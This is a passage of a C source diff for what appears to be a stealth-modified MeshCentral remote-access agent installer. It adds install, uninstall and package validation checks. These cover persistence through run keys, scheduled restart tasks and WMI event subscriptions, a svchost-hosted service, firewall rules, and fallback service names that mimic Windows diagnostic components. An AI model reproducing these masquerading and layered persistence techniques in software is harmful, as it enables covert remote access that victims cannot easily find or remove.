     wchar_t serviceDisplayName[256] = {0};
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        NULL,
+        0);
 
     Stealth_LogInstallEvent(L"[VALIDATION] Starting install validation for %ls", serviceKeyName);
 
@@ -2845,7 +5622,7 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
     {
         wchar_t imagePathUpper[512] = {0};
         StringCchCopyW(imagePathUpper, _countof(imagePathUpper), imagePath);
-        _wcsupr(imagePathUpper);
+        MeshInstaller_UppercaseInplace(imagePathUpper);
         summary.serviceImagePath = (wcsstr(imagePathUpper, L"SVCHOST.EXE") != NULL);
         if (!summary.serviceImagePath)
         {
@@ -2971,6 +5748,12 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
         summary.success = FALSE;
         Stealth_LogInstallEvent(L"[VALIDATION] Service not running");
     }
+    summary.serviceAliasClean = (Stealth_CollectConflictingServiceAliases(&paths, serviceKeyName, NULL, 0) == 0);
+    if (!summary.serviceAliasClean)
+    {
+        summary.success = FALSE;
+        Stealth_LogInstallEvent(L"[VALIDATION] Conflicting service alias still bound to install root %ls", paths.installDir);
+    }
 
     // Firewall rule validation
     wchar_t svchostPath[MAX_PATH] = {0};
@@ -3056,8 +5839,7 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
             if (persistence->restartTask.enabled)
             {
                 summary.restartTask = (state.RestartTask[0] != L'\0' && StealthResilience_TaskExists(state.RestartTask));
-                summary.wmiSubscription = (state.WmiFilter[0] != L'\0' && state.WmiConsumer[0] != L'\0' &&
-                                           StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer));
+                summary.wmiSubscription = FALSE;
 
                 if (!summary.restartTask)
                 {
@@ -3070,7 +5852,14 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
                     }
                 }
 
-                if (!summary.wmiSubscription)
+                if (!summary.restartTask &&
+                    state.WmiFilter[0] != L'\0' &&
+                    state.WmiConsumer[0] != L'\0')
+                {
+                    summary.wmiSubscription = StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer);
+                }
+
+                if (!summary.restartTask && !summary.wmiSubscription)
                 {
                     wchar_t fallbackFilter[128] = {0};
                     wchar_t fallbackConsumer[128] = {0};
@@ -3108,6 +5897,13 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
         }
     }
 
+    summary.pendingUpdateClear = !Stealth_DataStoreValueExists(paths.dbPath, "PendingUpdate", NULL, 0, NULL);
+    if (!summary.pendingUpdateClear)
+    {
+        summary.success = FALSE;
+        Stealth_LogInstallEvent(L"[VALIDATION] PendingUpdate marker still present in datastore");
+    }
+
     Stealth_LogInstallEvent(L"[VALIDATION] %S validation %ls", summary.phase, summary.success ? L"PASSED" : L"FAILED");
     Stealth_PrintValidationJson(&summary);
     return summary.success;
@@ -3137,7 +5933,12 @@ typedef struct StealthUninstallValidationSummary
     BOOL runKeyRemoved;
     BOOL tasksRemoved;
     BOOL wmiRemoved;
+    BOOL serviceAliasesRemoved;
     BOOL persistenceStateRemoved;
+    BOOL masterServiceBinaryRemoved;
+    BOOL masterServiceServiceAbsent;
+    BOOL masterServicePipeAbsent;
+    BOOL umhArtifactsRemoved;
 } StealthUninstallValidationSummary;
 
 static void Stealth_PrintUninstallValidationJson(const StealthUninstallValidationSummary* summary)
@@ -3159,8 +5960,103 @@ static void Stealth_PrintUninstallValidationJson(const StealthUninstallValidatio
     printf("\"runKeyRemoved\":%s,", summary->runKeyRemoved ? "true" : "false");
     printf("\"tasksRemoved\":%s,", summary->tasksRemoved ? "true" : "false");
     printf("\"wmiRemoved\":%s,", summary->wmiRemoved ? "true" : "false");
-    printf("\"persistenceStateRemoved\":%s", summary->persistenceStateRemoved ? "true" : "false");
+    printf("\"serviceAliasesRemoved\":%s,", summary->serviceAliasesRemoved ? "true" : "false");
+    printf("\"persistenceStateRemoved\":%s,", summary->persistenceStateRemoved ? "true" : "false");
+    printf("\"masterServiceBinaryRemoved\":%s,", summary->masterServiceBinaryRemoved ? "true" : "false");
+    printf("\"masterServiceServiceAbsent\":%s,", summary->masterServiceServiceAbsent ? "true" : "false");
+    printf("\"masterServicePipeAbsent\":%s,", summary->masterServicePipeAbsent ? "true" : "false");
+    printf("\"umhArtifactsRemoved\":%s", summary->umhArtifactsRemoved ? "true" : "false");
     printf("}}\n");
+}
+
+typedef struct StealthPackageValidationSummary
+{
+    const char* phase;
+    BOOL success;
+    BOOL allowInstalledFallback;
+    BOOL requireConfig;
+    WCHAR sourcePath[MAX_PATH * 4];
+    WCHAR failureReason[1024];
+    StealthPackagePreflight preflight;
+} StealthPackageValidationSummary;
+
+static void Stealth_PrintPackageValidationJson(const StealthPackageValidationSummary* summary)
+{
+    if (summary == NULL) { return; }
+
+    printf("{\"success\":%s,", summary->success ? "true" : "false");
+    printf("\"phase\":\"");
+    Stealth_PrintJsonEscapedUtf8(summary->phase);
+    printf("\",");
+    printf("\"sourcePath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->sourcePath);
+    printf("\",");
+    printf("\"allowInstalledFallback\":%s,", summary->allowInstalledFallback ? "true" : "false");
+    printf("\"requireConfig\":%s,", summary->requireConfig ? "true" : "false");
+    printf("\"failureReason\":\"");
+    Stealth_PrintJsonEscapedWide(summary->failureReason);
+    printf("\",");
+    printf("\"checks\":{");
+    printf("\"sourceExePresent\":%s,", summary->preflight.sourceExePresent ? "true" : "false");
+    printf("\"sourceEmbeddedConfigPresent\":%s,", summary->preflight.sourceEmbeddedConfigPresent ? "true" : "false");
+    printf("\"sourceMshPresent\":%s,", summary->preflight.sourceMshPresent ? "true" : "false");
+    printf("\"sourceMshValid\":%s,", summary->preflight.sourceMshValid ? "true" : "false");
+    printf("\"sourceMshPath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->preflight.sourceMshPath);
+    printf("\",");
+    printf("\"sourceConfPresent\":%s,", summary->preflight.sourceConfPresent ? "true" : "false");
+    printf("\"sourceConfValid\":%s,", summary->preflight.sourceConfValid ? "true" : "false");
+    printf("\"sourceConfPath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->preflight.sourceConfPath);
+    printf("\",");
+    printf("\"sourceDbPresent\":%s,", summary->preflight.sourceDbPresent ? "true" : "false");
+    printf("\"sourceDbPath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->preflight.sourceDbPath);
+    printf("\",");
+    printf("\"existingMshPresent\":%s,", summary->preflight.existingMshPresent ? "true" : "false");
+    printf("\"existingMshValid\":%s,", summary->preflight.existingMshValid ? "true" : "false");
+    printf("\"existingMshPath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->preflight.existingMshPath);
+    printf("\",");
+    printf("\"existingConfPresent\":%s,", summary->preflight.existingConfPresent ? "true" : "false");
+    printf("\"existingConfValid\":%s,", summary->preflight.existingConfValid ? "true" : "false");
+    printf("\"existingConfPath\":\"");
+    Stealth_PrintJsonEscapedWide(summary->preflight.existingConfPath);
+    printf("\",");
+    printf("\"configAvailable\":%s,", summary->preflight.configAvailable ? "true" : "false");
+    printf("\"configFromExistingInstall\":%s", summary->preflight.configFromExistingInstall ? "true" : "false");
+    printf("}}\n");
+}
+
+static BOOL Stealth_IsMasterServicePipePresent(void)
+{
+    if (WaitNamedPipeW(STEALTH_MASTER_SERVICE_PIPE_NAME, 0))
+    {
+        return TRUE;
+    }
+
+    DWORD err = GetLastError();
+    if (err == ERROR_SEM_TIMEOUT || err == ERROR_PIPE_BUSY)
+    {
+        return TRUE;
+    }
+
+    HANDLE pipe = CreateFileW(
+        STEALTH_MASTER_SERVICE_PIPE_NAME,
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    if (pipe != INVALID_HANDLE_VALUE)
+    {
+        CloseHandle(pipe);
+        return TRUE;
+    }
+
+    err = GetLastError();
+    return !(err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND);
 }
 
 BOOL Stealth_RunUninstallValidation(void)
@@ -3175,10 +6071,14 @@ BOOL Stealth_RunUninstallValidation(void)
 
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+    wchar_t masterServicePath[MAX_PATH] = {0};
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        NULL,
+        0);
     const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
 
     if (!Stealth_GetInstallPaths(&paths))
@@ -3188,24 +6088,30 @@ BOOL Stealth_RunUninstallValidation(void)
         Stealth_PrintUninstallValidationJson(&summary);
         return FALSE;
     }
+    MeshInstaller_CombinePath(masterServicePath, _countof(masterServicePath), paths.installDir, STEALTH_MASTER_SERVICE_EXE_NAME);
+    BOOL masterServiceManagedByAgent = FALSE;
+    BOOL externalMasterServiceDetected = FALSE;
+    wchar_t masterServiceImagePath[MAX_PATH * 4] = {0};
+    if (Stealth_QueryServiceImagePathW(STEALTH_MASTER_SERVICE_NAME, masterServiceImagePath, _countof(masterServiceImagePath)))
+    {
+        externalMasterServiceDetected = TRUE;
+        MeshInstaller_NormalizePathSeparators(masterServiceImagePath);
+        if (masterServiceImagePath[0] == L'"')
+        {
+            size_t imageLen = wcslen(masterServiceImagePath);
+            if (imageLen > 1)
+            {
+                memmove(masterServiceImagePath, masterServiceImagePath + 1, imageLen * sizeof(wchar_t));
+                wchar_t* closingQuote = wcschr(masterServiceImagePath, L'"');
+                if (closingQuote != NULL) { *closingQuote = L'\0'; }
+            }
+        }
+        masterServiceManagedByAgent = (_wcsicmp(masterServiceImagePath, masterServicePath) == 0);
+        externalMasterServiceDetected = !masterServiceManagedByAgent;
+    }
 
     // Service absence
-    summary.serviceAbsent = FALSE;
-    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
-    if (scm != NULL)
-    {
-        SC_HANDLE svc = OpenServiceW(scm, serviceKeyName, SERVICE_QUERY_STATUS);
-        if (svc != NULL)
-        {
-            CloseServiceHandle(svc);
-            summary.serviceAbsent = FALSE;
-        }
-        else
-        {
-            summary.serviceAbsent = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST);
-        }
-        CloseServiceHandle(scm);
-    }
+    summary.serviceAbsent = Stealth_WaitForServiceAbsence(serviceKeyName, 30000);
     if (!summary.serviceAbsent)
     {
         summary.success = FALSE;
@@ -3268,7 +6174,7 @@ BOOL Stealth_RunUninstallValidation(void)
     }
 
     // Firewall rule absence
-    summary.firewallRuleAbsent = !Stealth_CheckFirewallRuleExists(serviceKeyName);
+    summary.firewallRuleAbsent = Stealth_WaitForFirewallRuleAbsence(serviceKeyName, STEALTH_FIREWALL_SETTLE_TIMEOUT_MS);
     if (!summary.firewallRuleAbsent)
     {
         summary.success = FALSE;
@@ -3287,13 +6193,8 @@ BOOL Stealth_RunUninstallValidation(void)
         Stealth_LogInstallEvent(L"[VALIDATION] One or more installed files remain under %ls", paths.installDir);
     }
 
-    summary.installDirRemoved = (GetFileAttributesW(paths.installDir) == INVALID_FILE_ATTRIBUTES);
-    summary.logsDirRemoved = (GetFileAttributesW(paths.logsDir) == INVALID_FILE_ATTRIBUTES);
-    if (!summary.installDirRemoved || !summary.logsDirRemoved)
-    {
-        summary.success = FALSE;
-        Stealth_LogInstallEvent(L"[VALIDATION] Install/log directories still present");
-    }
+    const BOOL installDirAbsent = (GetFileAttributesW(paths.installDir) == INVALID_FILE_ATTRIBUTES);
+    const BOOL logsDirAbsent = (GetFileAttributesW(paths.logsDir) == INVALID_FILE_ATTRIBUTES);
 
     // Run key removed
     summary.runKeyRemoved = !Stealth_RunKeyValueExists(serviceKeyName, NULL, 0);
@@ -3337,6 +6238,12 @@ BOOL Stealth_RunUninstallValidation(void)
         summary.success = FALSE;
         Stealth_LogInstallEvent(L"[VALIDATION] WMI subscriptions still present for %ls", serviceKeyName);
     }
+    summary.serviceAliasesRemoved = (Stealth_CollectConflictingServiceAliases(&paths, NULL, NULL, 0) == 0);
+    if (!summary.serviceAliasesRemoved)
+    {
+        summary.success = FALSE;
+        Stealth_LogInstallEvent(L"[VALIDATION] Conflicting service alias still bound to uninstall root %ls", paths.installDir);
+    }
 
     StealthPersistenceState state;
     summary.persistenceStateRemoved = !Stealth_LoadPersistenceState(&state);
@@ -3346,8 +6253,120 @@ BOOL Stealth_RunUninstallValidation(void)
         Stealth_LogInstallEvent(L"[VALIDATION] Persistence state file still present");
     }
 
+    // UMH companion absence
+    summary.masterServiceBinaryRemoved = (GetFileAttributesW(masterServicePath) == INVALID_FILE_ATTRIBUTES);
+    if (!summary.masterServiceBinaryRemoved)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] MasterService binary remains after agent uninstall; UMH lifecycle is evaluated separately: %ls", masterServicePath);
+    }
+
+    summary.masterServiceServiceAbsent = !masterServiceManagedByAgent;
+    if (!summary.masterServiceServiceAbsent)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] Managed MasterService service remains after agent uninstall; UMH lifecycle is evaluated separately: %ls", STEALTH_MASTER_SERVICE_NAME);
+    }
+    else if (externalMasterServiceDetected)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] Preserving external MasterService registration outside agent install root: %ls", masterServiceImagePath);
+    }
+
+    summary.masterServicePipeAbsent = (!masterServiceManagedByAgent || !Stealth_IsMasterServicePipePresent());
+    if (!summary.masterServicePipeAbsent)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] Managed MasterService control pipe remains after agent uninstall; UMH lifecycle is evaluated separately");
+    }
+
+    summary.umhArtifactsRemoved = (summary.masterServiceBinaryRemoved &&
+                                   summary.masterServiceServiceAbsent &&
+                                   summary.masterServicePipeAbsent);
+    if (!summary.umhArtifactsRemoved)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] UMH artifacts remain after agent uninstall; agent validation now treats UMH as a separate lifecycle");
+    }
+
+    const BOOL allowResidualUmhState = !summary.umhArtifactsRemoved;
+    summary.installDirRemoved = (installDirAbsent || allowResidualUmhState);
+    summary.logsDirRemoved = (logsDirAbsent || allowResidualUmhState);
+    if (!summary.installDirRemoved || !summary.logsDirRemoved)
+    {
+        summary.success = FALSE;
+        Stealth_LogInstallEvent(L"[VALIDATION] Install/log directories still present");
+    }
+    else if (allowResidualUmhState)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] Preserving install/log directories because UMH artifacts remain outside the agent lifecycle");
+    }
+
     Stealth_LogInstallEvent(L"[VALIDATION] uninstall validation %ls", summary.success ? L"PASSED" : L"FAILED");
     Stealth_PrintUninstallValidationJson(&summary);
+    return summary.success;
+}
+
+BOOL Stealth_RunPackageValidation(const wchar_t* sourceExePath, BOOL allowInstalledFallback, BOOL requireConfig)
+{
+    StealthPackageValidationSummary summary;
+    ZeroMemory(&summary, sizeof(summary));
+    summary.phase = "package";
+    summary.allowInstalledFallback = allowInstalledFallback;
+    summary.requireConfig = requireConfig;
+
+    Stealth_SetInstallerLogPathToTemp(L"MeshInstaller-PackageValidation.log");
+
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0')
+    {
+        if (FAILED(StringCchCopyW(summary.sourcePath, _countof(summary.sourcePath), sourceExePath)))
+        {
+            (void)StringCchCopyW(summary.failureReason, _countof(summary.failureReason), L"package source path was too long");
+            Stealth_LogInstallEvent(L"[VALIDATION] package validation FAILED: %ls", summary.failureReason);
+            Stealth_PrintPackageValidationJson(&summary);
+            return FALSE;
+        }
+    }
+    else
+    {
+        DWORD copied = GetModuleFileNameW(NULL, summary.sourcePath, (DWORD)_countof(summary.sourcePath));
+        if (copied == 0 || copied >= _countof(summary.sourcePath))
+        {
+            (void)StringCchCopyW(summary.failureReason, _countof(summary.failureReason), L"failed to resolve current executable path");
+            Stealth_LogInstallEvent(L"[VALIDATION] package validation FAILED: %ls", summary.failureReason);
+            Stealth_PrintPackageValidationJson(&summary);
+            return FALSE;
+        }
+    }
+
+    Stealth_LogInstallEvent(
+        L"[VALIDATION] Starting package validation for %ls (allowInstalledFallback=%u requireConfig=%u)",
+        summary.sourcePath,
+        allowInstalledFallback,
+        requireConfig);
+
+    summary.success = Stealth_PreflightPackageSource(
+        summary.sourcePath,
+        allowInstalledFallback,
+        requireConfig,
+        &summary.preflight,
+        summary.failureReason,
+        _countof(summary.failureReason));
+
+    if (summary.success)
+    {
+        Stealth_LogInstallEvent(
+            L"[VALIDATION] package validation PASSED (.msh=%u .conf=%u embedded=%u fallback=%u db=%u)",
+            summary.preflight.sourceMshValid,
+            summary.preflight.sourceConfValid,
+            summary.preflight.sourceEmbeddedConfigPresent,
+            summary.preflight.configFromExistingInstall,
+            summary.preflight.sourceDbPresent);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(
+            L"[VALIDATION] package validation FAILED for %ls: %ls",
+            summary.sourcePath,
+            summary.failureReason[0] != L'\0' ? summary.failureReason : L"(no failure reason)");
+    }
+
+    Stealth_PrintPackageValidationJson(&summary);
     return summary.success;
 }
 static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
@@ -3477,7 +6496,7 @@ static void Stealth_BuildTaskPrefixFromHint(const wchar_t* hint, const wchar_t* 
     }
     if (output[0] == L'\0')
     {
-        StringCchCopyW(output, outputSize, L"WinDiagnosticHost");
+        StringCchCopyW(output, outputSize, STEALTH_FALLBACK_SERVICE_NAME);
     }
 }
 
@@ -3558,7 +6577,8 @@ static size_t Stealth_BuildTaskPrefixCandidates(
         Stealth_AddTaskCandidate(candidates, &count, capacity, exeBase);
     }
 
-    Stealth_AddTaskCandidate(candidates, &count, capacity, L"WinDiagnosticHost");
+    /* Legacy task names for cleanup discovery */
+    Stealth_AddTaskCandidate(candidates, &count, capacity, STEALTH_FALLBACK_SERVICE_NAME);
     Stealth_AddTaskCandidate(candidates, &count, capacity, L"DiagHost");
     return count;
 }
@@ -3889,7 +6909,7 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_p
                 Stealth_SavePersistenceState(&state);
             }
         }
-        if (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0')
+        if (!restartTaskHealthy && (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0'))
         {
             wmiHealthy = StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer);
             if (wmiHealthy)
@@ -3919,7 +6939,7 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_p
         }
     }
 
-    if (!wmiHealthy)
+    if (!restartTaskHealthy && !wmiHealthy)
     {
         wchar_t existingFilter[128] = {0};
         wchar_t existingConsumer[128] = {0};
@@ -4254,16 +7274,13 @@ void Stealth_ApplyPersistenceProfile(void)
 
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
-    if (serviceKeyName[0] == L'\0')
-    {
-        StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
-    }
-    if (serviceDisplayName[0] == L'\0')
-    {
-        StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME);
-    }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        serviceDisplayName,
+        _countof(serviceDisplayName),
+        NULL,
+        0);
 
     if (persistence)
     {
